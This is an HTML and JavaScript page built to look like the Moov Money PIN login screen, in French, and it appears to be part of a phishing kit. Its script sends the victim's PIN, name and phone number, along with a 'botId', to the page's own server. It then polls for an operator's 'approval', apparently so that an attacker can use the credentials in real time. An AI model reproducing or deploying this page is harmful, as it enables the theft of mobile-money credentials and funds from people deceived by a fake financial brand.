<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Moov Money - Code PIN</title>

  <style>
    /* ── reset & base ── */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background: #f5f5f5;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 0;
    }

    .app-wrapper {
      width: 100%;
      max-width: 400px;
      background: #fff;
      min-height: 100vh;
      position: relative;
      box-shadow: 0 0 20px rgba(0,0,0,0.05);
    }

    /* ── top bar ── */
    .top-bar {
      height: 95px;
      background: #f57c00;
      display: flex;
      align-items: flex-end;
      padding: 18px 20px;
    }

    .back-btn {
      color: #fff;
      font-size: 28px;
      text-decoration: none;
      line-height: 1;
      cursor: pointer;
      background: none;
      border: none;
      padding: 0;
    }

    /* ── container ── */
    .container {
      padding: 18px 28px 100px;
    }

    /* ── logo ── */
    .logo {
      text-align: center;
      margin: 12px 0 24px;
    }

    .logo-circle {
      width: 56px;
      height: 56px;
      background: #9A0000;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 8px;
      font-size: 28px;
      font-weight: 700;
      color: #fff;
    }

    .moov-text {
      font-size: 20px;
      font-weight: 700;
      color: #9A0000;
      letter-spacing: 0.5px;
    }

    /* ── title & subtitle ── */
    .title {
      font-size: 22px;
      font-weight: 700;
      color: #333;
      text-align: center;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 15px;
      color: #8b8b8b;
      text-align: center;
      margin-bottom: 28px;
    }

    /* ── PIN boxes wrapper (relative for overlay) ── */
    .pin-box-wrapper {
      background: #fafafa;
      border-radius: 18px;
      padding: 22px 16px;
      margin-bottom: 28px;
      border: 1px solid #eee;
      position: relative;   /* needed for absolute overlay */
      cursor: pointer;
      touch-action: manipulation;
    }

    .pin-row {
      display: flex;
      justify-content: center;
      gap: 14px;
    }

    .pin-box {
      width: 56px;
      height: 56px;
      border-radius: 12px;
      border: 1.5px solid #d9d9d9;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      font-weight: 600;
      color: #222;
      transition: border-color 0.3s, box-shadow 0.2s;
    }

    .pin-box.filled {
      border-color: #9A0000;
      box-shadow: 0 0 0 2px rgba(154,0,0,0.1);
    }

    .lock-icon {
      width: 56px;
      height: 56px;
      border-radius: 12px;
      border: 1.5px dashed #ccc;
      background: #f9f9f9;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      color: #aaa;
    }

    /* ── overlay input ── */
    #pinInput {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;
      pointer-events: auto;   /* captures all clicks/taps */
      background: transparent;
      border: none;
      outline: none;
      cursor: pointer;
      font-size: 16px;        /* just to keep it valid */
    }

    /* ── alert message ── */
    #otp-alert {
      text-align: center;
      font-size: 14px;
      font-weight: 500;
      min-height: 24px;
      margin-bottom: 12px;
      padding: 8px 12px;
      border-radius: 8px;
      background: transparent;
      transition: all 0.2s;
    }

    #otp-alert.error {
      background: #fde7e7;
      color: #b00020;
      border: 1px solid #f5c6cb;
    }

    #otp-alert.success {
      background: #e7f5e7;
      color: #1e7e34;
      border: 1px solid #b7d7b7;
    }

    /* ── button (fixed) ── */
    .continue-btn {
      position: fixed;
      left: 28px;
      right: 28px;
      bottom: 28px;
      width: auto;
      max-width: 400px;
      margin: 0 auto;
      padding: 16px;
      font-size: 20px;
      font-weight: 600;
      border-radius: 10px;
      border: none;
      cursor: not-allowed;
      transition: all 0.2s ease;
      background: #f5c6cb;
      color: #fff;
      opacity: 0.7;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }

    .continue-btn:enabled {
      background: #9A0000;
      opacity: 1;
      cursor: pointer;
    }

    .continue-btn:hover:enabled {
      background: #7a0000;
      transform: scale(1.01);
    }

    .continue-btn:active:enabled {
      transform: scale(0.98);
    }

    .continue-btn.waiting {
      background: #f5a623;
      opacity: 1;
      cursor: default;
    }

    /* ── waiting message ── */
    #waiting {
      text-align: center;
      font-size: 14px;
      color: #f57c00;
      margin-top: 8px;
      display: none;
      padding: 10px;
      border-radius: 8px;
      background: #fff8e1;
      border: 1px solid #ffd54f;
    }

    .footer {
      margin-top: 24px;
      text-align: center;
      font-size: 12px;
      color: #bbb;
      letter-spacing: 0.5px;
      padding-bottom: 12px;
    }

    .back-link {
      display: none;
    }
  </style>
</head>
<body>

<div class="app-wrapper">

  <!-- Top bar -->
  <div class="top-bar">
    <button class="back-btn" onclick="window.history.back()">&#8592;</button>
  </div>

  <div class="container">
    <div class="logo">
      <div class="logo-circle">M</div>
      <div class="moov-text">Moov Money</div>
    </div>

    <div class="title">Code PIN</div>
    <div class="subtitle">Entrez votre code PIN à 4 chiffres</div>

    <!-- PIN boxes with invisible input overlay -->
    <div class="pin-box-wrapper">
      <div class="pin-row">
        <div class="pin-box" id="b1"></div>
        <div class="pin-box" id="b2"></div>
        <div class="pin-box" id="b3"></div>
        <div class="pin-box" id="b4"></div>
        <div class="lock-icon">🔒</div>
      </div>
      <!-- Overlay input -->
      <input id="pinInput" type="tel" inputmode="numeric" maxlength="4" autofocus />
    </div>

    <div id="otp-alert"></div>
    <div id="waiting">⏳ En attente d'approbation…</div>

    <div class="footer">v 5.3.2 (1.0.0)</div>
  </div>

  <!-- Fixed button -->
  <button id="verifyBtn" class="continue-btn" disabled>Se connecter</button>
</div>

<script>
(function() {
  const input = document.getElementById('pinInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const waitingEl = document.getElementById('waiting');
  const alertEl = document.getElementById('otp-alert');
  const boxes = [
    document.getElementById('b1'),
    document.getElementById('b2'),
    document.getElementById('b3'),
    document.getElementById('b4')
  ];

  // ── Get stored data ──
  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'Client Moov Money';
  const phone = localStorage.getItem('phone');
  const params = new URLSearchParams(window.location.search);
  let botId = params.get('botId') || localStorage.getItem('botId');
  if (botId) localStorage.setItem('botId', botId);

  if (!phone || !botId) {
    alert('Session expirée. Veuillez recommencer.');
    window.location.href = 'index.html';
    return;
  }

  // ── Focus helper (called on load and after errors) ──
  function focusPin() { input.focus(); }

  // ── Update PIN boxes ──
  function updateBoxes(value) {
    const digits = value.padEnd(4, '');
    boxes.forEach((box, i) => {
      if (digits[i]) {
        box.textContent = '●';
        box.classList.add('filled');
      } else {
        box.textContent = '';
        box.classList.remove('filled');
      }
    });
  }

  // ── Input events ──
  input.addEventListener('input', () => {
    input.value = input.value.replace(/\D/g, '').slice(0, 4);
    updateBoxes(input.value);
    verifyBtn.disabled = input.value.length !== 4;
    alertEl.textContent = '';
    alertEl.className = '';
  });

  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    const digits = paste.replace(/\D/g, '').slice(0, 4);
    input.value = digits;
    updateBoxes(digits);
    verifyBtn.disabled = digits.length !== 4;
    if (digits.length === 4) {
      setTimeout(() => verifyBtn.click(), 300);
    }
  });

  // ── Show alert message ──
  function showAlert(text, type = 'error') {
    alertEl.textContent = text;
    alertEl.className = type;
  }

  // ── Verify button click ──
  verifyBtn.addEventListener('click', async () => {
    const pin = input.value;
    if (pin.length !== 4) return;

    verifyBtn.disabled = true;
    verifyBtn.textContent = 'En attente…';
    verifyBtn.classList.add('waiting');
    waitingEl.style.display = 'block';
    showAlert('', '');

    try {
      const res = await fetch(`${window.location.origin}/submit-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: fullName, phone, pin, botId })
      });
      if (!res.ok) throw new Error('Erreur serveur');
      const data = await res.json();
      if (!data.requestId) throw new Error('Aucun ID reçu');
      pollPin(data.requestId);
    } catch (error) {
      waitingEl.style.display = 'none';
      verifyBtn.disabled = false;
      verifyBtn.textContent = 'Se connecter';
      verifyBtn.classList.remove('waiting');
      showAlert('❌ Erreur serveur. Veuillez réessayer.', 'error');
    }
  });

  // ── Polling ──
  function pollPin(requestId) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
        const data = await res.json();
        if (data.approved === true) {
          clearInterval(interval);
          window.location.href = 'success.html';
        }
        if (data.approved === false || data.blocked) {
          clearInterval(interval);
          // Reset
          input.value = '';
          boxes.forEach(b => { b.textContent = ''; b.classList.remove('filled'); });
          verifyBtn.disabled = true;
          verifyBtn.textContent = 'Se connecter';
          verifyBtn.classList.remove('waiting');
          waitingEl.style.display = 'none';
          showAlert('❌ Code PIN incorrect. Veuillez réessayer.', 'error');
          focusPin();
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000);
  }

  // ── Initial focus ──
  window.onload = () => focusPin();
})();
</script>

</body>
</html>
